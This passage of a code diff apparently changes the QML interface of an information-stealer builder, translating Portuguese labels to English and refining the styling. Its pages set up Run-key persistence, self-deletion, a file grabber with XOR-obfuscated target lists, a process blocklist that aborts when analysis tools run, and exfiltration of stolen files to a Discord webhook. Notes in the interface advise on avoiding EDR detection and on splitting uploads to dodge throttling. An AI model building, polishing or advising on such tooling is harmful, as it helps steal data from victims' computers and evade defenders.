                 badge: backend.persistencia_ativos + "/" + backend.persistencia_total
 
                 ColumnLayout {
                     Layout.fillWidth: true
                     spacing: 2
 
-                    ToggleRow { title: "HKCU Run key"; sub: "sobe junto com o login do usuario"
+                    ToggleRow { title: "HKCU Run key"; sub: "starts with the user's login"
                                 on: backend.persistir; onToggled: (state) => backend.persistir = state }
-                    ToggleRow { title: "Self-delete"; sub: "rename-and-reopen, some do disco"
+                    ToggleRow { title: "Self-delete"; sub: "rename-and-reopen, vanishes from disk"
                                 on: backend.auto_destruir; onToggled: (state) => backend.auto_destruir = state }
                 }
             }
@@ -792,8 +908,8 @@ ApplicationWindow {
             Note {
                 tone: backend.persistir ? "#ef4444" : "#6b7280"
                 text: backend.persistir
-                      ? "run key ligada: o binario fica residente e vira IOC permanente no host — mais chance de EDR pegar em re-scan."
-                      : "sem persistencia o binario roda uma vez e morre. menor pegada, menos reincidencia."
+                      ? "run key on: the binary stays resident and becomes a permanent IOC on the host — a re-scan is more likely to catch it with EDR."
+                      : "without persistence the binary runs once and dies. smaller footprint, less recurrence."
             }
         }
     }
@@ -803,18 +919,18 @@ ApplicationWindow {
         id: grabberPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
                 title: "file grabber"
-                hint: "varredura de arquivos por extensao"
-                badge: backend.pegador_arquivos ? "ligado" : "desligado"
+                hint: "file scan by extension"
+                badge: backend.pegador_arquivos ? "on" : "off"
 
                 RowLayout {
                     Layout.fillWidth: true
                     spacing: 12
 
-                    FieldLabel { text: "limite por arquivo"; Layout.alignment: Qt.AlignVCenter }
+                    FieldLabel { text: "limit per file"; Layout.alignment: Qt.AlignVCenter }
 
                     Stepper {
                         value: backend.tamanho_max_arquivo
@@ -827,7 +943,7 @@ ApplicationWindow {
                     Item { Layout.fillWidth: true }
                 }
 
-                FieldLabel { text: "caminhos varridos" }
+                FieldLabel { text: "scanned paths" }
                 InputBox {
                     Layout.fillWidth: true
                     value: backend.caminhos_pegador
@@ -835,7 +951,7 @@ ApplicationWindow {
                     onEdited: (text) => backend.caminhos_pegador = text
                 }
 
-                FieldLabel { text: "extensoes  ·  " + backend.extensoes_total + " alvos" }
+                FieldLabel { text: "extensions  ·  " + backend.extensoes_total + " targets" }
                 InputArea {
                     Layout.fillWidth: true
                     Layout.preferredHeight: 96
@@ -846,7 +962,7 @@ ApplicationWindow {
 
             Note {
                 tone: "#e879f9"
-                text: "a lista de extensoes e caminhos sai ofuscada (XOR) no binario — nao aparece em strings do exe."
+                text: "the extension and path lists ship XOR-obfuscated inside the binary — they never show up in the exe's strings."
             }
         }
     }
@@ -856,14 +972,14 @@ ApplicationWindow {
         id: blocklistPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
                 title: "process blocklist"
-                hint: "aborta se algum destes estiver rodando"
-                badge: backend.blocklist_total + " processos"
+                hint: "aborts if any of these is running"
+                badge: backend.blocklist_total + " processes"
 
-                FieldLabel { text: "um nome por linha" }
+                FieldLabel { text: "one name per line" }
                 InputArea {
                     Layout.fillWidth: true
                     Layout.preferredHeight: 300
@@ -874,17 +990,17 @@ ApplicationWindow {
         }
     }
 
-    // ---------- 08 EXFILTRACAO ----------
+    // ---------- 08 EXFILTRATION ----------
     Component {
         id: exfilPage
         ColumnLayout {
             width: pageLoader.width
-            spacing: 14
+            spacing: 16
 
             Card {
-                title: "exfiltracao"
-                hint: "destino do que foi coletado"
-                badge: backend.webhook_ok ? "configurado" : "placeholder"
+                title: "exfiltration"
+                hint: "destination for everything collected"
+                badge: backend.webhook_ok ? "configured" : "placeholder"
 
                 FieldLabel { text: "webhook url" }
                 InputBox {
@@ -896,8 +1012,8 @@ ApplicationWindow {
 
                 Rectangle {
                     Layout.fillWidth: true
-                    implicitHeight: 42
-                    radius: 8
+                    implicitHeight: 44
+                    radius: 9
                     color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.08) : Qt.rgba(0.937, 0.267, 0.267, 0.08)
                     border.width: 1
                     border.color: backend.webhook_ok ? Qt.rgba(0.133, 0.773, 0.369, 0.35) : Qt.rgba(0.937, 0.267, 0.267, 0.35)
@@ -918,8 +1034,8 @@ ApplicationWindow {
                         Label {
                             Layout.fillWidth: true
                             text: backend.webhook_ok
-                                  ? "endpoint pronto: host e path vao pro ajuste.zig"
-                                  : "url ainda e o placeholder — troque antes de compilar"
+                                  ? "endpoint ready: host and path go into ajuste.zig"
+                                  : "url is still the placeholder — replace it before building"
                             color: backend.webhook_ok ? "#22c55e" : "#ef4444"
                             font.family: "JetBrains Mono"
                             font.pixelSize: 11
@@ -940,13 +1056,13 @@ ApplicationWindow {
 
             Note {
                 tone: "#e879f9"
-                text: "o payload sai em chunks multipart pro mesmo webhook. discord derruba em burst longo — se for volume alto, divide entre dois hooks."
+                text: "the payload leaves in multipart chunks to the same webhook. discord throttles long bursts — for high volume, split it across two hooks."
             }
         }
     }
 
     // ==========================================================
-    //  COMPONENTES
+    //  COMPONENTS
     // ==========================================================
 
     component Card : Rectangle {
@@ -960,29 +1076,45 @@ ApplicationWindow {
         default property alias body: bodyCol.data
 
         Layout.fillWidth: true
-        implicitHeight: col.implicitHeight + 30
-        color: "#0d0d0d"
-        radius: 10
+        implicitHeight: col.implicitHeight + 34
+        radius: 12
+
+        gradient: Gradient {
+            GradientStop { position: 0.0; color: cardHover.hovered ? "#111111" : "#0f0f0f" }
+            GradientStop { position: 1.0; color: "#0a0a0a" }
+        }
         border.width: 1
-        border.color: "#1a1a1a"
+        border.color: cardHover.hovered ? "#242424" : "#1a1a1a"
+        Behavior on border.color { ColorAnimation { duration: 140 } }
+
+        // top highlight hairline
+        Rectangle {
+            anchors.left: parent.left
+            anchors.right: parent.right
+            anchors.top: parent.top
+            anchors.margins: 1
+            height: 1
+            radius: parent.radius
+            color: Qt.rgba(1, 1, 1, 0.03)
+        }
 
         ColumnLayout {
             id: col
             anchors.left: parent.left
             anchors.right: parent.right
             anchors.top: parent.top
-            anchors.margins: 15
-            spacing: 12
+            anchors.margins: 17
+            spacing: 13
 
             RowLayout {
                 Layout.fillWidth: true
-                spacing: 9
+                spacing: 10
                 visible: card.title !== ""
 
                 Rectangle {
                     Layout.alignment: Qt.AlignVCenter
                     implicitWidth: 3
-                    implicitHeight: 13
+                    implicitHeight: 14
                     radius: 2
                     color: card.accent
                 }
@@ -1005,28 +1137,32 @@ ApplicationWindow {
                     font.pixelSize: 10
                     elide: Text.ElideRight
                 }
-                Label {
-                    text: card.badge
+
+                // badge pill
+                Rectangle {
                     visible: card.badge !== ""
-                    color: "#6b7280"
-                    font.family: "JetBrains Mono"
-                    font.pixelSize: 10
+                    implicitWidth: badgeLabel.implicitWidth + 18
+                    implicitHeight: 22
+                    radius: 6
+                    color: "#141414"
+                    border.width: 1
+                    border.color: "#202020"
+                    Label {
+                        id: badgeLabel
+                        anchors.centerIn: parent
+                        text: card.badge
+                        color: "#8b8b93"
+                        font.family: "JetBrains Mono"
+                        font.pixelSize: 9
+                    }
                 }
+
                 Label {
                     text: card.open ? "−" : "+"
                     visible: card.collapsible
                     color: "#6b7280"
                     font.family: "JetBrains Mono"
-                    font.pixelSize: 13
-                }
-
-                HoverHandler {
-                    enabled: card.collapsible
-                    cursorShape: Qt.PointingHandCursor
-                }
-                TapHandler {
-                    enabled: card.collapsible
-                    onTapped: card.open = !card.open
+                    font.pixelSize: 14
                 }
             }
 
@@ -1036,6 +1172,16 @@ ApplicationWindow {
                 spacing: 10
                 visible: card.open
             }
+        }
+
+        HoverHandler {
+            id: cardHover
+            enabled: card.collapsible
+            cursorShape: Qt.PointingHandCursor
+        }
+        TapHandler {
+            enabled: card.collapsible
+            onTapped: card.open = !card.open
         }
     }
 
@@ -1048,30 +1194,64 @@ ApplicationWindow {
         property real progress: -1
 
         Layout.fillWidth: true
-        implicitHeight: 96
-        radius: 10
-        color: "#0d0d0d"
+        implicitHeight: 104
+        radius: 12
+
+        gradient: Gradient {
+            GradientStop { position: 0.0; color: statHover.hovered ? "#121212" : "#0f0f0f" }
+            GradientStop { position: 1.0; color: "#0a0a0a" }
+        }
         border.width: 1
-        border.color: "#1a1a1a"
+        border.color: statHover.hovered ? "#242424" : "#1a1a1a"
+        Behavior on border.color { ColorAnimation { duration: 140 } }
+
+        // accent strip at the top, fading out
+        Rectangle {
+            anchors.left: parent.left
+            anchors.right: parent.right
+            anchors.top: parent.top
+            anchors.leftMargin: 1
+            anchors.rightMargin: 1
+            anchors.topMargin: 1
+            height: 2
+            radius: parent.radius
+            gradient: Gradient {
+                orientation: Gradient.Horizontal
+                GradientStop { position: 0.0; color: Qt.rgba(stat.accent.r, stat.accent.g, stat.accent.b, 0.85) }
+                GradientStop { position: 1.0; color: "#00000000" }
+            }
+        }
 
         ColumnLayout {
             anchors.fill: parent
-            anchors.margins: 14
+            anchors.margins: 15
             spacing: 3
 
-            Label {
-                text: stat.label
-                color: "#6b7280"
-                font.family: "JetBrains Mono"
-                font.pixelSize: 9
-                font.letterSpacing: 1.4
-                font.capitalization: Font.AllUppercase
+            RowLayout {
+                Layout.fillWidth: true
+                spacing: 6
+                Rectangle {
+                    implicitWidth: 6
+                    implicitHeight: 6
+                    radius: 3
+                    color: stat.accent
+                }
+                Label {
+                    Layout.fillWidth: true
+                    text: stat.label
+                    color: "#6b7280"
+                    font.family: "JetBrains Mono"
+                    font.pixelSize: 9
+                    font.letterSpacing: 1.4
+                    font.capitalization: Font.AllUppercase
+                    elide: Text.ElideRight
+                }
             }
             Label {
                 text: stat.value
                 color: stat.accent
                 font.family: "JetBrains Mono"
-                font.pixelSize: 25
+                font.pixelSize: 26
                 font.bold: true
             }
             Label {
@@ -1099,6 +1279,8 @@ ApplicationWindow {
                 }
             }
         }
+
+        HoverHandler { id: statHover }
     }
 
     component MiniStat : Rectangle {
@@ -1107,15 +1289,15 @@ ApplicationWindow {
         property color tone: "#d1d5db"
 
         Layout.fillWidth: true
-        implicitHeight: 48
-        radius: 8
+        implicitHeight: 50
+        radius: 9
         color: "#0a0a0a"
         border.width: 1
-        border.color: "#171717"
+        border.color: "#1a1a1a"
 
         ColumnLayout {
             anchors.fill: parent
-            anchors.margins: 10
+            anchors.margins: 11
             spacing: 1
             Label {
                 text: parent.parent.label
@@ -1153,8 +1335,12 @@ ApplicationWindow {
             font.family: "JetBrains Mono"
             font.pixelSize: 10
         }
-        Label {
+        Rectangle {
             Layout.fillWidth: true
+            implicitHeight: 1
+            color: "#161616"
+        }
+        Label {
             Layout.minimumWidth: 0
             text: parent.value
             color: parent.tone
@@ -1199,20 +1385,29 @@ ApplicationWindow {
         property bool on: true
         property color accent: "#d946ef"
 
-        implicitWidth: chipLabel.implicitWidth + 22
-        implicitHeight: 24
-        radius: 6
-        color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.13) : "#101010"
+        implicitWidth: chipLabel.implicitWidth + 30
+        implicitHeight: 26
+        radius: 8
+        color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.12) : "#0f0f0f"
         border.width: 1
-        border.color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.42) : "#191919"
+        border.color: chip.on ? Qt.rgba(chip.accent.r, chip.accent.g, chip.accent.b, 0.40) : "#1a1a1a"
 
-        Label {
-            id: chipLabel
+        RowLayout {
             anchors.centerIn: parent
-            text: chip.label
-            color: chip.on ? "#e879f9" : "#4b4b53"
-            font.family: "JetBrains Mono"
-            font.pixelSize: 10
+            spacing: 7
+            Rectangle {
+                implicitWidth: 6
+                implicitHeight: 6
+                radius: 3
+                color: chip.on ? chip.accent : "#3f3f46"
+            }
+            Label {
+                id: chipLabel
+                text: chip.label
+                color: chip.on ? "#f0abfc" : "#4b4b53"
+                font.family: "JetBrains Mono"
+                font.pixelSize: 10
+            }
         }
     }
 
@@ -1225,12 +1420,16 @@ ApplicationWindow {
 
         Layout.fillWidth: true
         implicitHeight: 38
-        radius: 8
-        color: active ? Qt.rgba(0.851, 0.275, 0.937, 0.11) : (hov.hovered ? "#111111" : "transparent")
+        radius: 9
+        color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.12)
+                          : (hov.hovered ? "#131313" : "transparent")
+        Behavior on color { ColorAnimation { duration: 130 } }
 
+        // left accent bar
         Rectangle {
             anchors.left: parent.left
             anchors.verticalCenter: parent.verticalCenter
+            anchors.leftMargin: 1
             width: 3
             height: 18
             radius: 2
@@ -1241,16 +1440,26 @@ ApplicationWindow {
 
         RowLayout {
             anchors.fill: parent
-            anchors.leftMargin: 14
+            anchors.leftMargin: 13
             anchors.rightMargin: 12
-            spacing: 10
+            spacing: 11
 
-            Label {
-                text: nav.code
-                color: nav.active ? "#d946ef" : "#3f3f46"
-                font.family: "JetBrains Mono"
-                font.pixelSize: 10
-                font.bold: nav.active
+            Rectangle {
+                Layout.alignment: Qt.AlignVCenter
+                implicitWidth: 22
+                implicitHeight: 22
+                radius: 6
+                color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.18) : "#101010"
+                border.width: 1
+                border.color: nav.active ? Qt.rgba(0.851, 0.275, 0.937, 0.45) : "#1c1c1c"
+                Label {
+                    anchors.centerIn: parent
+                    text: nav.code
+                    color: nav.active ? "#e879f9" : "#52525b"
+                    font.family: "JetBrains Mono"
+                    font.pixelSize: 9
+                    font.bold: nav.active
+                }
             }
             Label {
                 Layout.fillWidth: true
@@ -1280,36 +1489,41 @@ ApplicationWindow {
         signal toggled(bool state)
 
         Layout.fillWidth: true
-        implicitHeight: 50
-        radius: 8
-        color: hov.hovered ? "#111111" : "transparent"
+        implicitHeight: 54
+        radius: 10
+        color: row.on ? Qt.rgba(0.851, 0.275, 0.937, 0.05)
+                      : (hov.hovered ? "#111111" : "#0c0c0c")
         border.width: 1
-        border.color: hov.hovered ? "#1a1a1a" : "transparent"
+        border.color: row.on ? Qt.rgba(0.851, 0.275, 0.937, 0.22)
+                             : (hov.hovered ? "#202020" : "#151515")
+        Behavior on color { ColorAnimation { duration: 140 } }
+        Behavior on border.color { ColorAnimation { duration: 140 } }
 
         RowLayout {
             anchors.fill: parent
-            anchors.leftMargin: 10
-            anchors.rightMargin: 12
-            spacing: 12
+            anchors.leftMargin: 13
+            anchors.rightMargin: 14
+            spacing: 13
 
+            // switch
             Rectangle {
                 Layout.alignment: Qt.AlignVCenter
-                implicitWidth: 38
-                implicitHeight: 20
-                radius: 10
-                color: row.on ? "#d946ef" : "#141414"
+                implicitWidth: 40
+                implicitHeight: 22
+                radius: 11
+                color: row.on ? "#d946ef" : "#161616"
                 border.width: row.on ? 0 : 1
                 border.color: "#2a2a2a"
                 Behavior on color { ColorAnimation { duration: 130 } }
 
                 Rectangle {
-                    width: 14
-                    height: 14
-                    radius: 7
+                    width: 16
+                    height: 16
+                    radius: 8
                     y: 3
                     x: row.on ? parent.width - width - 3 : 3
                     color: row.on ? "#050505" : "#6b7280"
-                    Behavior on x { NumberAnimation { duration: 130; easing.type: Easing.OutCubic } }
+                    Behavior on x { NumberAnimation { duration: 150; easing.type: Easing.OutCubic } }
                     Behavior on color { ColorAnimation { duration: 130 } }
                 }
             }
@@ -1323,7 +1537,7 @@ ApplicationWindow {
                     Layout.minimumWidth: 0
                     Layout.preferredWidth: 0
                     text: row.title
-                    color: row.on ? "#d1d5db" : "#71717a"
+                    color: row.on ? "#e5e7eb" : "#71717a"
                     font.family: "JetBrains Mono"
                     font.pixelSize: 12
                     elide: Text.ElideRight
@@ -1354,24 +1568,27 @@ ApplicationWindow {
         signal picked()
 
         Layout.fillWidth: true
-        implicitHeight: 50
-        radius: 8
-        color: selected ? Qt.rgba(0.851, 0.275, 0.937, 0.10) : (hov.hovered ? "#111111" : "transparent")
+        implicitHeight: 54
+        radius: 10
+        color: opt.selected ? Qt.rgba(0.851, 0.275, 0.937, 0.10)
+                            : (hov.hovered ? "#111111" : "#0c0c0c")
         border.width: 1
-        border.color: selected ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
+        border.color: opt.selected ? Qt.rgba(0.851, 0.275, 0.937, 0.55)
+                                   : (hov.hovered ? "#202020" : "#151515")
+        Behavior on border.color { ColorAnimation { duration: 140 } }
 
         RowLayout {
             anchors.fill: parent
-            anchors.leftMargin: 12
-            anchors.rightMargin: 12
-            spacing: 10
+            anchors.leftMargin: 13
+            anchors.rightMargin: 13
+            spacing: 11
 
             Rectangle {
                 id: radio
                 Layout.alignment: Qt.AlignVCenter
-                implicitWidth: 14
-                implicitHeight: 14
-                radius: 7
+                implicitWidth: 16
+                implicitHeight: 16
+                radius: 8
                 color: "transparent"
                 border.width: 1
                 border.color: opt.selected ? "#d946ef" : "#2a2a2a"
@@ -1395,7 +1612,7 @@ ApplicationWindow {
                     Layout.minimumWidth: 0
                     Layout.preferredWidth: 0
                     text: opt.label
-                    color: opt.selected ? "#e879f9" : "#d1d5db"
+                    color: opt.selected ? "#f0abfc" : "#d1d5db"
                     font.family: "JetBrains Mono"
                     font.pixelSize: 12
                     font.bold: opt.selected
@@ -1425,10 +1642,10 @@ ApplicationWindow {
         signal picked(int index)
 
         Layout.minimumWidth: 0
-        implicitHeight: 36
+        implicitHeight: 38
         implicitWidth: segRow.implicitWidth + 8
-        radius: 8
-        color: "#0a0a0a"
+        radius: 9
+        color: "#080808"
         border.width: 1
         border.color: "#1a1a1a"
 
@@ -1447,9 +1664,11 @@ ApplicationWindow {
                     Layout.minimumWidth: 0
                     implicitWidth: segLabel.implicitWidth + 26
                     radius: 6
-                    color: index === seg.current ? Qt.rgba(0.851, 0.275, 0.937, 0.18) : (hov2.hovered ? "#141414" : "transparent")
+                    color: index === seg.current ? Qt.rgba(0.851, 0.275, 0.937, 0.20)
+                                                 : (hov2.hovered ? "#141414" : "transparent")
                     border.width: index === seg.current ? 1 : 0
                     border.color: Qt.rgba(0.851, 0.275, 0.937, 0.5)
+                    Behavior on color { ColorAnimation { duration: 130 } }
 
                     Label {
                         id: segLabel
@@ -1459,7 +1678,7 @@ ApplicationWindow {
                         anchors.leftMargin: 8
                         anchors.rightMargin: 8
                         text: modelData
-                        color: index === seg.current ? "#e879f9" : "#6b7280"
+                        color: index === seg.current ? "#f0abfc" : "#6b7280"
                         font.family: "JetBrains Mono"
                         font.pixelSize: 11
                         font.bold: index === seg.current
@@ -1507,9 +1726,9 @@ ApplicationWindow {
         signal stepped(int v)
 
         implicitWidth: 150
-        implicitHeight: 34
-        radius: 8
-        color: "#0a0a0a"
+        implicitHeight: 36
+        radius: 9
+        color: "#080808"
         border.width: 1
         border.color: "#1a1a1a"
 
@@ -1556,20 +1775,20 @@ ApplicationWindow {
         property alias placeholder: input.placeholderText
         signal edited(string text)
 
-        implicitHeight: 34
+        implicitHeight: 36
         text: value
-        leftPadding: 10
-        rightPadding: 10
+        leftPadding: 11
+        rightPadding: 11
         color: "#d1d5db"
         placeholderTextColor: "#3f3f46"
         selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
-        selectedTextColor: "#e879f9"
+        selectedTextColor: "#f0abfc"
         font.family: "JetBrains Mono"
         font.pixelSize: 11
         onTextChanged: input.edited(text)
         background: Rectangle {
-            color: "#0a0a0a"
-            radius: 8
+            color: "#080808"
+            radius: 9
             border.width: 1
             border.color: input.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
             Behavior on border.color { ColorAnimation { duration: 120 } }
@@ -1582,20 +1801,20 @@ ApplicationWindow {
         signal edited(string text)
 
         text: value
-        leftPadding: 10
-        rightPadding: 10
-        topPadding: 8
-        bottomPadding: 8
+        leftPadding: 11
+        rightPadding: 11
+        topPadding: 9
+        bottomPadding: 9
         color: "#d1d5db"
         selectionColor: Qt.rgba(0.851, 0.275, 0.937, 0.35)
-        selectedTextColor: "#e879f9"
+        selectedTextColor: "#f0abfc"
         font.family: "JetBrains Mono"
         font.pixelSize: 11
         wrapMode: TextArea.Wrap
         onTextChanged: area.edited(text)
         background: Rectangle {
-            color: "#0a0a0a"
-            radius: 8
+            color: "#080808"
+            radius: 9
             border.width: 1
             border.color: area.activeFocus ? Qt.rgba(0.851, 0.275, 0.937, 0.55) : "#1a1a1a"
             Behavior on border.color { ColorAnimation { duration: 120 } }
@@ -1609,12 +1828,24 @@ ApplicationWindow {
         property color fg: "#050505"
         signal clicked()
 
-        implicitWidth: btnLabel.implicitWidth + 44
-        implicitHeight: 34
-        radius: 8
-        color: btn.enabled ? (bh.hovered ? Qt.lighter(btn.fill, 1.12) : btn.fill) : "#141414"
+        implicitWidth: btnLabel.implicitWidth + 48
+        implicitHeight: 36
+        radius: 9
+        color: btn.enabled ? (bh.hovered ? Qt.lighter(btn.fill, 1.14) : btn.fill) : "#141414"
         opacity: btn.enabled ? 1 : 0.6
         Behavior on color { ColorAnimation { duration: 120 } }
+
+        // subtle top sheen
+        Rectangle {
+            visible: btn.enabled && btn.fill !== "#141414"
+            anchors.left: parent.left
+            anchors.right: parent.right
+            anchors.top: parent.top
+            anchors.margins: 1
+            height: 1
+            radius: parent.radius
+            color: Qt.rgba(1, 1, 1, 0.28)
+        }
 
         Label {
             id: btnLabel
@@ -1637,21 +1868,21 @@ ApplicationWindow {
         property color tone: "#e879f9"
 
         Layout.fillWidth: true
-        implicitHeight: Math.max(40, noteText.implicitHeight + 24)
-        radius: 8
+        implicitHeight: Math.max(44, noteText.implicitHeight + 26)
+        radius: 10
         color: Qt.rgba(tone.r, tone.g, tone.b, 0.06)
         border.width: 1
         border.color: Qt.rgba(tone.r, tone.g, tone.b, 0.22)
 
         RowLayout {
             anchors.fill: parent
-            anchors.leftMargin: 12
-            anchors.rightMargin: 12
-            spacing: 10
+            anchors.leftMargin: 13
+            anchors.rightMargin: 13
+            spacing: 11
 
             Rectangle {
                 Layout.alignment: Qt.AlignTop
-                Layout.topMargin: 6
+                Layout.topMargin: 7
                 implicitWidth: 3
                 implicitHeight: 14
                 radius: 2
@@ -1662,14 +1893,14 @@ ApplicationWindow {
                 Layout.fillWidth: true
                 Layout.minimumWidth: 0
                 Layout.preferredWidth: 0
-                Layout.topMargin: 12
-                Layout.bottomMargin: 12
+                Layout.topMargin: 13
+                Layout.bottomMargin: 13
                 text: parent.parent.text
                 color: "#9ca3af"
                 font.family: "JetBrains Mono"
                 font.pixelSize: 10
                 wrapMode: Text.Wrap
-                lineHeight: 1.35
+                lineHeight: 1.4
             }
         }
     }
